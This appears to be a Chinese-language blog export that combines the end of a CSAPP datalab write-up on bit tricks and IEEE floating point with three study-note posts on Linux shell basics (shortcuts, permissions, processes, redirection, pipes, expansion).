<p>​	经过上面的一系列操作，提交之后会发现还是没有过，这是因为如果x是-1也会返回1，那只要想办法排除-1即可。注意到如果x是-1的话，加1就会变成0，那么这个时候只要在最上面的思路中再加上修正项!(x+1)即可，如果x为-1就会返回0，从而顺利通过了这个函数。</p>
<h2 id="allOddBits"><a class="header-anchor" href="#allOddBits">¶</a>allOddBits</h2>
<p>​	本题要求使用*! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*来判断参数x的所有奇数位是否是1，是则返回1，否则返回0。位数从低到高依次为0~31</p>
<p>​	本体主要设计一个掩码就行了，即所有奇数位都为1的0xAAAAAAAA，然后利用&amp;运算取出x的所有奇数位，然后用异或判断是否全为1</p>
<h2 id="negate"><a class="header-anchor" href="#negate">¶</a>negate</h2>
<p>​	本题要求使用*! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*来求出参数x的相反数。</p>
<p>​	其实根据书上的定义来就行了，按位取反再加1</p>
<h2 id="isAsciiDigit"><a class="header-anchor" href="#isAsciiDigit">¶</a>isAsciiDigit</h2>
<p>​	本题要求使用*! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*判断参数x是否在0x30到0x39之间。</p>
<p>​	这道题最开始初看比较懵逼，没有什么思路，后来参考了网上的一些思路，最后也算是好不容易做出来了。</p>
<p>​	其实这道题目比较关键的在于如何用位运算去表示一个范围，这里采取了很精妙的方案，即设计两个边界，上边界在加上比0x39大的数之后会由正变负，而下边界在加上比0x30小的数之后还是负的。然后取出两个边界的符号位进行判断即可。</p>
<h2 id="conditional"><a class="header-anchor" href="#conditional">¶</a>conditional</h2>
<p>​	本题要求使用*! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*实现三目运算符。</p>
<p>​	其实主要的观点就是把判断条件x从0值和非0值转换成0值和-1，这样就可以利用x&amp;y|~x&amp;z的方法进行选择输出</p>
<p>​	那么关键就是对x的转换了，这里采用的是两次求非的方法，将x转换成0或1，然后求其相反数即可。</p>
<h2 id="isLessOrEqual"><a class="header-anchor" href="#isLessOrEqual">¶</a>isLessOrEqual</h2>
<p>​	本题要求使用 *! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*实现小于等于的判断。</p>
<p>​	其实这个思路也很明确，就是在符号相同的时候相减不会发生移除，直接减就行，在符号不同的时候特判一下符号就行。</p>
<h2 id="logicalNeg"><a class="header-anchor" href="#logicalNeg">¶</a>logicalNeg</h2>
<p>​	本题要求使用 *! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*实现逻辑非。</p>
<p>​	最开始认为这是一个很简单的题，后来想想好像没有那么简单。</p>
<p>​	因为最主要是要把0和其它值区别开，所以这里要考虑相反数，因为只有0和最小值的相反数是他本身。然后因为0和最小值的二进制串只有符号位是不同的，所以可以考虑将本身和其相反数进行取反，然后再右移31位加1即可。</p>
<h2 id="howManyBits"><a class="header-anchor" href="#howManyBits">¶</a>howManyBits</h2>
<p>​	本题要求使用 *! ~ &amp; ^ | + &lt;&lt; &gt;&gt;*实现求参数x的补码位数。</p>
<p>​	首先分析一下，如果x是正数的话，只需要统计x最高的1在哪一位，然后加上符号位即可。如果x是负数的话，只需要统计x最高的0在哪一位，然后加上符号位即可。之所以要统计最高的0，这是由补码的表示方法决定的。</p>
<p>​	具体实现的话，考虑借助五个常量，将32位分隔成16+8+4+2+1+1，以正数为例，先考虑高16位是否有1，如果有的话则至少用16位，这个用b16去记录，然后接下来将x右移十六位去统计接下来八位是否有1，用b8记录，依次类推即可。最终将这5个标记加起来，再加上符号位即可。</p>
<p>​	注意最开始需要对x进行预处理。</p>
<hr>
<p><strong>上面的这些题全都是整形的部分，在之前都已经了解过，所以也没有复盘相关的知识，下面是浮点数的知识，还是需要总结一下的</strong></p>
<h1>浮点数部分</h1>
<h2 id="IEEE标准"><a class="header-anchor" href="#IEEE标准">¶</a>IEEE标准</h2>
<p>​	该标准用类似于科学计数法的方法表示浮点数，即每一个浮点数可以被表示为$V=(-1)^s\times M\times 2^E$。</p>
<p>​	其中s为符号位，s为0时为正，s为1时为负。M为尾数，是一个二进制小数，范围是$0$到$1-\epsilon$，或者$1$到$2-\epsilon$，其中$\epsilon$的值一般是$2^{-k}，k&gt;0$。E为阶码，是一个二进制整数，可正可负，主要作用是给尾数加权。</p>
<p>​	浮点数分为单精度和双精度，就是对应了C语言中的float和double。float为32位，包括1位符号位，8位阶码以及23位尾数。double为64位，包括1位符号位，11位阶码以及52位尾数。</p>
<p>​	对于阶码E的值，浮点数可以分为三种不同的情况，分别是规格化的、非规格化的、特殊值，先贴一张书中对于单精度的三种情况的表示。其中特殊值有被分成了两种情况。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145549617.png" alt="image-20220326145549617"></p>
<p>​	下面对三种情况进行说明：</p>
<ol>
<li>
<p>第一种情况就是规格化的，即单精度浮点数的阶码不为0也不为255，这种浮点数的阶码会被传换成一个“偏置”后的有符号数。所谓偏置，就是在原来的基础上再加上一个偏移量Bias，对于阶码位数为k，一般Bias=$2^{k-1}-1$</p>
<p>对于这时候的尾数，是一个小于1的小数或者0，而再计算浮点数的数值时，会在尾数值得基础上加1。</p>
</li>
<li>
<p>第二种情况是非规格化的，此时阶码全为0，讲道理，按照1中得情况，真实阶码值应该是-Bias，但是这里为了能够使其平滑的过渡到规格化浮点数，我们将其设置成1-Bias。对于尾数，这里不会加1，因为一旦加了1，不管怎么都取不到0。非规格化得浮点数主要作用或许就是可以表示0，此外这里得0根据符号位的不同还有正负之分</p>
</li>
<li>
<p>第三种情况是特殊值，此时阶码全为1。如果尾数位全为0，则表示无穷大，根据符号位来得出是正无穷大还是负无穷大，而若尾数不全为0，则表示NaN</p>
</li>
</ol>
<p>​    然后说一下规格化和非规格化的取值范围。</p>
<p>​	先说一下非规格化，对于阶码，此时就是确定的k个0，即$E=2-2^{k-1}$，下面考察三种情况：</p>
<ol>
<li>当尾数是n个0的时候，此时值为+0.0</li>
<li>当尾数最低位为1，其余全为0的时候，此时为最小非0值，即尾数为$M=2<sup>{-n}$，此时值为$2</sup>{2-2^{k-1}-n}$。</li>
<li>当尾数为n个1的时候，此时为非规格化的最大值，具体的值我就不算了。</li>
</ol>
<p>​    然后说一下规格化，如下：</p>
<ol>
<li>当阶码最低位为1，其余全为0的时候，是最小的非规格化的值，此时的阶码和非规格化的阶码相同，<strong>这正是之前取1-Bias而不是-Bias的功劳</strong>。此时的值为$2<sup>{2-2</sup>{k-1}}$</li>
<li>当阶码最高位为0，其余全为1，尾数为n个0的时候，此时的值为1，因为取了偏置。</li>
<li>当阶码最低位为0，其余全为1，尾数为n个1的时候，此时取到最大值，经过计算得到$(1-2^{-n-1})\times 2<sup>{2</sup>{k-1}}$</li>
</ol>
<p>​    书中也给出了单双精度的取值范围，这里直接贴图。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326145615331.png" alt="image-20220326145615331"></p>
<p>​	图中exp为阶码位，frac为尾数位。</p>
<h2 id="浮点数舍入"><a class="header-anchor" href="#浮点数舍入">¶</a>浮点数舍入</h2>
<p>​	按照日常生活，在需要舍入的时候，我们通常使用四舍五入，不过对于浮点数，有更多的舍入方式，即<strong>向偶数舍入、向零舍入、向上舍入、向下舍入</strong>。</p>
<p>​	这些方式从字面意义上还是很容易理解的，向偶数舍入就是向最近的偶数靠近，其它的意思就不再赘述了。按理来说，向偶数舍入看起来会更合理一点，尤其是在统计的时候，可以最大程度的中和舍入带来的误差。</p>
<p>​	对于IEEE的规则，一般在中间值的时候会考虑向偶数舍入，其它的情况都是舍入到离它最近的值。在二进制中，一般认为<strong>末尾为0则是偶数</strong></p>
<p>​	举个例子，比如10.10011，舍入到个位就是11，舍入到小数点后1位就是10.1，舍入到小数点后4位就是10.1010</p>
<h2 id="浮点数运算"><a class="header-anchor" href="#浮点数运算">¶</a>浮点数运算</h2>
<p>​	在IEEE标准中，浮点数的运算规则大致就是将两个浮点数运算后的舍入值作为最终的精确值。这就会导致平常生活中的一些常见规律在这里是用不了的。所以这就会导致编译器不会对浮点数做相关的优化</p>
<h2 id="floatScale2"><a class="header-anchor" href="#floatScale2">¶</a>floatScale2</h2>
<p>​	本题可以使用任何整形或者无符号整形的运算符，返回参数uf与2相乘的结果，注意如果参数是NaN的时候返回参数。</p>
<p>​	这个题的主要思路是这样的。因为题目也提示了如果是NaN这种特殊值的时候需要返回参数，那就可以先对特殊情况进行处理，因为其实浮点数乘2在正常情况下就是阶码位加一。</p>
<p>​	先考虑如果参数是NaN或者无穷的话，就直接返回参数，其实如果是0的话也是要返回参数的。根据上文对IEEE标准的说明，我们需要先把阶码位和符号位提取出来。如果阶码位全为0的话，说明是非规格化浮点数，这个时候只需要左移一位即可，但是注意左移会让原本的符号位消失，所以还需要加上符号位。然后如果阶码全为1，即为255的时候，说明是特殊值，直接返回参数即可。</p>
<p>​	然后排除了上面的几种情况，就可以对阶码位操作，根据上文的IEEE标准，只需要让阶码位自增即可。当然这个时候也有一种特殊情况，即<strong>自增后阶码位全为1</strong>，这个时候直接返回无穷大这个特殊值即可，注意加上符号位。如果不是这种情况，就返回值即可。</p>
<h2 id="floatFloat2Int"><a class="header-anchor" href="#floatFloat2Int">¶</a>floatFloat2Int</h2>
<p>​	本题可以使用任何整形或者无符号整形的运算符，返回将参数uf转换成浮点数位级表示。其实就是看如何把传入进来的无符号整形uf转换成正常的二进制，个人感觉和舍入差不多</p>
<p>​	可以考虑将uf的三部分提取出来，即exp、sign、frac。</p>
<p>​	首先考虑一些特殊情况，比如如果为0，即exp和frac均为0，直接返回0即可。如果exp是0xff，那么返回NaN或Infinity对应的值即可。</p>
<p>​	接下来就是非规格化和规格化两种情况，对于非规格化，此时exp为0，此时由于偏置的作用，考虑到之前讨论过的非规格化的取值范围，不管尾数是多少，必然向0舍入。</p>
<p>​	对于规格化，情况要复杂一点。首先先根据exp的值计算出阶码E的值，注意根据IEEE标准中的计算公式，这里的E就是尾数部分移动的位数，也就是说，如果E大于31，肯定溢出，如果E小于0，也不行，这样去处理特殊情况。然后是一些正常情况，如果E大于23，就可以直接把frac部分左移E-23位，因为frac本身是有23位的，E大于23意味着这23位都可以保留，并且还可以多扩充几个0。相反则右移23-E位，最后结合符号位范围frac即可。</p>
<h2 id="floatPower2"><a class="header-anchor" href="#floatPower2">¶</a>floatPower2</h2>
<p>​	本题可以使用任何整形或者无符号整形的运算符，计算$2.0^{x}$，最后用无符号表示。</p>
<p>​	这个题就需要考察之前提到的几种情况的范围，比如对于非规格化来说，首先阶数带来了-126，然后frac部分还有-23，因此如果x小于-149的时候，就不用算了，返回0就行。而当x介于-149和-128之间，属于非规格化，这个等会再说，当x介于-127和127之间的时候，x显然属于规格化，这个具体可以看上面的分析，具体计算也等会再说。然后如果x再大一点，就要溢出了，直接返回Infinity即可。然后再看两种相对复杂的情况。</p>
<p>​	对于规格化，这个还比较简单，对于参数x，实际上x就相当于阶数E，只需要加上偏置量就可以得到exp，再右移回去即可。</p>
<p>​	对于非规格化，是这么一个情况，根据计算公式，现在有$2^{-126}\times M=2^x$，那么M对应的指数就是x+126，然后就是要考虑怎么去在frac部分表达这个数。举个例子，比如x=-128，那么M对应的指数就是-2，要表示这个值，其实就是在把左往右数第22位变成1就行了，那其实这个转换的方法就已经很显然了吧。</p>
<h1>小结</h1>
<p>​	datalab就算是暂时告一段落了，不过以后有时间肯定是要再写一遍的，最开始对于浮点数的理解真的不到位，也是看了别人的题解才逐渐明白。开头整形部分有几个题的思路也很不好想，以后有时间还是要再做一遍。</p>
]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell（三）</title>
    <url>/2021/09/30/Linux%E4%B9%8BShell%E7%9A%84%E9%AB%98%E7%BA%A7%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="高级键盘技巧"><a href="#高级键盘技巧" class="headerlink" title="高级键盘技巧"></a>高级键盘技巧</h1><h2 id="编辑命令行"><a href="#编辑命令行" class="headerlink" title="编辑命令行"></a>编辑命令行</h2><p>​    这一部分主要基于<strong>Readline</strong>库，介绍了一些可以提高效率的特性</p>
<h3 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h3><ol>
<li>Ctrl+A，将光标移动到行首</li>
<li>Ctrl+E，将光标移动到行尾</li>
<li>Alt+F，将光标向前移动一个单词</li>
<li>Alt+B，将光标向后移动一个单词</li>
<li>Ctrl+L，清除屏幕，将光标移动到左上角</li>
</ol>
<h3 id="修改文本"><a href="#修改文本" class="headerlink" title="修改文本"></a>修改文本</h3><ol>
<li>Ctrl+T，将光标处字符与其之前的字符对调</li>
<li>Alt+T，将光标处单词与其之前的单词对调</li>
<li>Alt+L，将从光标处到单词结尾的字符转换成小写</li>
<li>Alt+U，转换成大写</li>
</ol>
<h3 id="剪切和粘贴文本"><a href="#剪切和粘贴文本" class="headerlink" title="剪切和粘贴文本"></a>剪切和粘贴文本</h3><ol>
<li>Ctrl+K，剪切从光标处到行尾的文本</li>
<li>Ctrl+U，剪切从光标处到行首的文本</li>
<li>Alt+D，剪切从光标处到当前单词结尾的文本</li>
<li>Alt+空格，剪切从光标处到当前单词开头的文本，如果已位于开头，剪切上一个文本</li>
<li>Ctrl+Y，将缓冲区内的文本粘贴到光标处</li>
</ol>
<h2 id="补全功能"><a href="#补全功能" class="headerlink" title="补全功能"></a>补全功能</h2><p>​    较常用的是路径名补全，只需要按下<strong>Tab</strong>键即可，如果有多个文件的话，不会触发自动补全的功能</p>
<p>​    然后介绍两个常用的组合键，即<strong>Alt+$</strong>，用来显示补全结果，当然连续两次Tab键也可以，另外就是<strong>Alt+*</strong>，可以插入所有可能的补全结果</p>
<h2 id="命令历史记录"><a href="#命令历史记录" class="headerlink" title="命令历史记录"></a>命令历史记录</h2><h3 id="搜索历史记录"><a href="#搜索历史记录" class="headerlink" title="搜索历史记录"></a>搜索历史记录</h3><p>​    可以通过命令<strong>history</strong>来查看近期使用过的命令</p>
<p>​    另外就是关于增量搜索，使用<strong>Ctrl+R</strong>组合键，可以进行搜索，然后使用回车键可以直接执行该命令，或者使用<strong>Ctrl+J</strong>可以将该命令复制到当前命令行</p>
<h3 id="历史扩展"><a href="#历史扩展" class="headerlink" title="历史扩展"></a>历史扩展</h3><p>​    通过在<strong>!</strong>之后加上数字可以插入某条历史记录，另外也可以通过<strong>script file</strong>命令将会话记录到指定文件</p>
<h1 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h1><h2 id="属主、属组、其他用户"><a href="#属主、属组、其他用户" class="headerlink" title="属主、属组、其他用户"></a>属主、属组、其他用户</h2><p>​    如果某文件属于某个用户，该用户（<strong>属主</strong>）具有访问权，用户反过来可以属于由一个或多个用户组成的组（<strong>属组</strong>），可以使用<strong>id</strong>命令查看用户身份信息，可以查询到uid和gid两个数字</p>
<h2 id="读取、写入和执行"><a href="#读取、写入和执行" class="headerlink" title="读取、写入和执行"></a>读取、写入和执行</h2><p>​    我们使用ls命令查看文件时，前面十个字符是文件属性，第一个是文件类型，剩下九个是文件模式，分别是文件属主、文件属组、其他用户的读取、写入、执行权限，详情可以看书</p>
<h3 id="修改文件模式"><a href="#修改文件模式" class="headerlink" title="修改文件模式"></a>修改文件模式</h3><p>​    chmod命令可以修改文件模式，只有文件属主或超级用户才能做到这一点，我们可以用八进制或符号来表示文件模式，该命令的板子大概就是</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 600 foo.txt</span><br></pre></td></tr></table></figure>
<p>​    这里用的就是八进制来表示文件模式，其实道理是非常显然的</p>
<p>​    符号表示法详情看书吧</p>
<p>​    另外也可以使用GUI来修改文件和陌路的权限，右击即可</p>
<h2 id="改变用户身份"><a href="#改变用户身份" class="headerlink" title="改变用户身份"></a>改变用户身份</h2><h3 id="su——以其他用户的身份启用Shell"><a href="#su——以其他用户的身份启用Shell" class="headerlink" title="su——以其他用户的身份启用Shell"></a>su——以其他用户的身份启用Shell</h3><ol>
<li>使用su [-[l]] [user]来更改用户</li>
<li>使用su -来变成超级用户</li>
<li>exit可以退出超级用户模式</li>
<li>su -c ‘command’将命令传入新shell执行</li>
</ol>
<h3 id="sudo——和su基本差不多"><a href="#sudo——和su基本差不多" class="headerlink" title="sudo——和su基本差不多"></a>sudo——和su基本差不多</h3><p>​    相比于su命令，sudo基本类似，然是有另外一些重要功能，它不需要启用新Shell，只需要输入自己的密码来进行认证即可</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>​    这一章需要等到多人合作的时候再看一下如何设置权限</p>
<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><ol>
<li>通过ps命令查看进程，不过输出非常简单</li>
<li>添加选项x，显示所有的进程，通过该选项显示出来的东西多了一个新列，表示进程状态</li>
<li>另外一个常用的选项是aux，可以输出更多的进程信息</li>
<li>ps命令仅仅是显示查看的那一刻的进程，而使用<strong>top</strong>命令可以动态查看进程，默认每三秒更新一次</li>
</ol>
<h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><ol>
<li><p>使用Ctrl+C来中断进程</p>
</li>
<li><p>注意到如果启动了一个新的程序，Shell可能是不会接收新的输入的，这个时候可以考虑用上述方法关闭，也可以考虑将其置于后台，在最开始命令结尾加上&amp;即可</p>
</li>
<li><p>可以使用jobs命令来查看作业列表</p>
</li>
<li><p>容易发现Ctrl+C对后台进程无效，我们可以使用fg命令加上作业参数来返回</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fg %1</span><br></pre></td></tr></table></figure>
<p>注意上面有一个百分号</p>
</li>
<li><p>如果我们仅仅只是想要停止进程，可以在前台使用Ctrl+Z组合键，然后可以使用<strong>bg</strong>命令加上作业参数来让程序在后台运行</p>
</li>
</ol>
<h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><ol>
<li><p>信号是系统与程序之间的通信途径之一，当终端接收到其中某个组合键时，向前台发送信号，程序监听信号并做出相应的操作</p>
</li>
<li><p>kill命令，用来向进程发送信号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kill -signal PID..</span><br></pre></td></tr></table></figure>
<p>如果不带选项的话，默认终止程序</p>
</li>
<li><p>killall，用来向多个进程发送信号</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">killall [-u user] [-signal] name ...</span><br></pre></td></tr></table></figure>
<p>killall和kill命令在向不属于自己的进程发信号时必须有超级用户权限</p>
</li>
</ol>
<h2 id="关闭系统"><a href="#关闭系统" class="headerlink" title="关闭系统"></a>关闭系统</h2><ol>
<li>这里介绍四个命令，都可以有序的终止所有进程，即halt，poweroff，reboot，shutdown</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    现在到这里，我们基本涉及到了Linux的Shell的很多基本命令，接下来会有更多丰富多彩的用法</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell（二）</title>
    <url>/2021/09/29/Linux%E4%B9%8BShell%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="和命令打交道"><a href="#和命令打交道" class="headerlink" title="和命令打交道"></a>和命令打交道</h1><h2 id="命令的含义"><a href="#命令的含义" class="headerlink" title="命令的含义"></a>命令的含义</h2><ol>
<li>可执行程序</li>
<li>Shell中的内建命令，如cd命令</li>
<li>Shell函数，也就是一些脚本</li>
<li>别名，即我们在其他命令基础上自定义的一些命令</li>
</ol>
<h2 id="识别命令"><a href="#识别命令" class="headerlink" title="识别命令"></a>识别命令</h2><ol>
<li><strong>type</strong>可以显示命令类型，<strong>type command</strong></li>
<li><strong>which</strong>可以显示可执行文件的位置，只适用于可执行文件，否则有可能会出现错误</li>
</ol>
<h2 id="获取命令文档"><a href="#获取命令文档" class="headerlink" title="获取命令文档"></a>获取命令文档</h2><ol>
<li><strong>help</strong>，获取Shell内建命令的帮助信息，另外就是在命令语法中，<strong>|</strong>表示项与项之间是互斥关系，而方括号表示这些项是可选的</li>
<li><strong>—help</strong>，在命令后面的长参数，显示该命令所支持的语法和选项的相关描述</li>
<li><strong>man</strong>，该命令主要用于浏览针对命令行的手册，<strong>man program</strong>，另外就是这里的<strong>man</strong>命令和<strong>less</strong>命令的操作是一样的，被分为了若干节，如果需要查询具体某一小节，可以在man后面加数字，man的-k选项和apropos命令有着一样的功能</li>
<li><strong>apropos</strong>，后面跟关键字，可以根据关键字匹配手册中的内容，可惜就是比较粗糙而已</li>
<li><strong>whatis</strong>，用来显示手册页的简述</li>
<li><strong>info</strong>，可以用来显示程序的info条目</li>
</ol>
<h2 id="创建自己的命令"><a href="#创建自己的命令" class="headerlink" title="创建自己的命令"></a>创建自己的命令</h2><ol>
<li>首先，可以通过在不同命令之间输入分号来一次性输入多条命令</li>
<li>大概的格式就是<strong>alias foo=’cd /usr; ls; cd -‘</strong>，这是一个示例，模板大概就是<strong>alias name=’string’</strong>，另外就是建议首先使用type命令查询该名称是否被使用</li>
<li><strong>unalias name</strong>可以用来删除自定义命令</li>
<li>不过要注意这里创建的都是临时变量，在关闭Shell时这些设置会自动取消</li>
</ol>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><p>​    这一部分主要用来讲述如何修改输出结果的去处和输入结果的来源</p>
<h2 id="标准输出重定向"><a href="#标准输出重定向" class="headerlink" title="标准输出重定向"></a>标准输出重定向</h2><p>​    要想不让输出出现在屏幕上，可以用重定向操作符<strong>&gt;</strong>，后面跟上文件名即可，就将输出保存到了后面的文件中，另外根据相应的介绍，我们可以通过<strong>&gt; filename</strong>来创建空文件。</p>
<p>​    另外可以通过<strong>&gt;&gt;</strong>来让输出加在文件的尾部</p>
<h2 id="标准错误重定向"><a href="#标准错误重定向" class="headerlink" title="标准错误重定向"></a>标准错误重定向</h2><ol>
<li>首先要知道的是标准错误重定向没有专门的重定向操作符，我们需要引用文件描述符，在文件流中，通常用0、1和2分别描述标准输入、标准输出和标准错误，即使用<strong>2&gt;</strong>可以重定向标准错误</li>
<li>将标准输出和标准错误定向到同一个文件中，只需要进行两次重定向，新版本的Bash提供了这样一种方法来定义，即<strong>ls -l /bin/usr &amp;&gt; ls-output,txt</strong>，追加的话只需要将其中的<strong>&gt;</strong>改成<strong>&gt;&gt;</strong>即可</li>
<li>丢弃用不着的输出结果，我们只需要将其定向到<strong>/dev/null</strong>文件即可，该文件是一个系统设备，可以接收输入结果而不做任何处理</li>
</ol>
<h2 id="标准输入重定向"><a href="#标准输入重定向" class="headerlink" title="标准输入重定向"></a>标准输入重定向</h2><ol>
<li><strong>cat</strong>命令，用来读取一个或多个文件并将其复制到标准输出，就是<strong>cat filename…</strong>，另外如果只输入cat，我们可以输入文件名，然后通过Ctrl+D，告诉cat已经到达了文件末尾</li>
<li>如果我们想要通过键盘输入并且将内容加到文件中，可以使用<strong>cat &gt; filename</strong>，这里大概进行了复合操作</li>
<li>另外可以通过<strong>&lt;</strong>来修改标准输入方式</li>
</ol>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>​    管道大概是一个非常形象的词语了，首先有操作符<strong>|</strong>，可以将一个命令的标准输出传给另一个命令的标准输入，<strong>command1 | command2</strong>，值得一提的是，之前学过的<strong>less</strong>命令可以实现标准输入，可以以浏览文件的形式查询标准输入</p>
<h3 id="排序列表"><a href="#排序列表" class="headerlink" title="排序列表"></a>排序列表</h3><p>​    sort命令可以用来对文件进行排序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /bin /usr/bin | sort | less</span><br></pre></td></tr></table></figure>
<p>​    另外就是要注意<strong>&gt;</strong>和<strong>|</strong>之间的差异，前者将命令与文件连接在一起，后者将一个命令的输出结果和另一个命令的输出结果连接在一起</p>
<h3 id="另外的一些命令"><a href="#另外的一些命令" class="headerlink" title="另外的一些命令"></a>另外的一些命令</h3><ol>
<li><p><strong>uniq</strong>命令，通常和sort命令结合使用，用来忽略或报告重复行，也可以使用-d选项来查看有哪些重复行</p>
</li>
<li><p><strong>wc</strong>命令，用来统计文件中换行符、单词和字节的数量</p>
</li>
<li><p><strong>grep</strong>命令，输出与模式匹配的行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep pattern filename</span><br></pre></td></tr></table></figure>
<p>选项-i忽略字母大小写，选项-v只输出不匹配指定模式的行</p>
</li>
<li><p><strong>head/tail</strong>，输出文件的开头/结尾部分，行数可以通过选项-n来调整，另外值得一提的就是tail通过加入-f选项可以实时观察文件，该过程用Ctrl+C结束</p>
</li>
<li><p><strong>tee</strong>，从标准输入中读取内容，复制到标准输出和其他文件中</p>
</li>
</ol>
<h1 id="一些有趣特性"><a href="#一些有趣特性" class="headerlink" title="一些有趣特性"></a>一些有趣特性</h1><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>​    在执行命令之前，Bash会执行一些替换操作，之前的像*这样的字符有很多含义，会对其进行扩展。</p>
<p>​    这里我们说一下<strong>echo</strong>命令，该命令将其文本参数输出到标准输出，但是如果后面跟通配符的话，不会输出通配符，因为执行之前通配符就被扩展了</p>
<h3 id="路径名扩展"><a href="#路径名扩展" class="headerlink" title="路径名扩展"></a>路径名扩展</h3><p>​    通配符的工作机制被称为路径名扩展，echo后面可以跟相应的组合</p>
<h3 id="浪纹线扩展"><a href="#浪纹线扩展" class="headerlink" title="浪纹线扩展"></a>浪纹线扩展</h3><p>​    其实代表的就是主目录</p>
<h3 id="算术扩展"><a href="#算术扩展" class="headerlink" title="算术扩展"></a>算术扩展</h3><p>​    形式为<strong>$((expression))</strong>，可以当作计算器来使用</p>
<h3 id="花括号扩展"><a href="#花括号扩展" class="headerlink" title="花括号扩展"></a>花括号扩展</h3><p>​    花括号扩展可以包含一个前导和一个后继，主要得到的是各个字符串，当然也可以嵌套</p>
<p>​    最大的作用就是创建文件或目录列表</p>
<h3 id="参数扩展"><a href="#参数扩展" class="headerlink" title="参数扩展"></a>参数扩展</h3><p>​    有各种各样的参数，但是如果打错了参数，输出为空</p>
<h3 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h3><p>​    <strong>echo $(cmd)</strong></p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>​    这里主要提供一些有选择的禁止不需要的扩展的方法</p>
<h3 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h3><p>​    将文本放在双引号中，一切的特殊字符将会失去特殊含义，但是<strong>参数扩展、算术扩展、命令替换仍然可用</strong></p>
<p>​    这样可以处理文件名中有空格的情况</p>
<p>​    另外就是将文本放在单引号中可以禁止一切扩展的发生</p>
<h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>​    在希望使用如$的单个字符时，要用转义，另外就是一些控制码，此略</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell（一）</title>
    <url>/2021/09/28/Linux%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E2%80%94%E2%80%94%E5%85%B3%E4%BA%8EShell/</url>
    <content><![CDATA[<h1 id="Shell简介"><a href="#Shell简介" class="headerlink" title="Shell简介"></a>Shell简介</h1><p>​    Shell是一个用来接收键盘输入的命令并将其传递给操作系统的程序，几乎所有的Linux程序使用的Shell是<strong>Bash</strong>，另外，在使用GUI的时候，我们需要所谓的<strong>终端仿真器</strong>来与Shell进行交互，在所有Linux版本中几乎都被简单地成为<strong>终端（terminal）</strong></p>
<h1 id="简单的使用"><a href="#简单的使用" class="headerlink" title="简单的使用"></a>简单的使用</h1><h2 id="一些基本的操作列举"><a href="#一些基本的操作列举" class="headerlink" title="一些基本的操作列举"></a>一些基本的操作列举</h2><ol>
<li>如果随便输入东西，会报错。</li>
<li>使用方向键上下可以查询<strong>命令历史</strong></li>
<li>方向键左右可以改变光标位置</li>
<li>需要注意的是，由于Windows发布较晚，导致很多快捷键不能在Linux中使用，因为他们很有可能已经有了别的作用</li>
<li>“焦点跟随鼠标”和“鼠标跟随焦点”两种策略</li>
<li><strong>date</strong>命令可以显示时间</li>
<li><strong>cal</strong>命令可以显示当前月的日历</li>
<li>另外就是使用快捷键<strong>Ctrl+Alt+F1~F6</strong>可以进入字符界面，<strong>Ctrl+Alt+F7</strong>可以返回GUI</li>
<li><strong>df</strong>命令可以查看当前磁盘可用空间，<strong>free</strong>可以查看可用内存容量</li>
<li>另外就是可以用<strong>Ctrl+D</strong>或者<strong>exit</strong>关闭终端对话</li>
</ol>
<h2 id="导航方面的命令"><a href="#导航方面的命令" class="headerlink" title="导航方面的命令"></a>导航方面的命令</h2><ol>
<li>首先需要明确Linux的文件系统树和Windows是差不多的，都是采用的树状结构</li>
<li><strong>pwd</strong>可以显示当前的工作目录</li>
<li><strong>ls</strong>命令可以列出当前工作目录中的文件和子目录</li>
<li><strong>cd</strong>命令可以更改当前工作目录，可以用绝对路径或相对路径，绝对路径很显然，而对于相对路径，用了两种表示法，即用<strong>.</strong>，表示当前目录，用<strong>..</strong>表示父目录，另外就是很多时候可以直接忽略掉<strong>./</strong></li>
<li>另外需要说一下Linux的一些特点，即<strong>没有文件拓展名</strong>，另外就是以点开头的文件是默认被隐藏的，ls命令在不使用<strong>ls -a</strong>的情况下不会显示</li>
<li>下面给一些cd命令的便捷写法<ul>
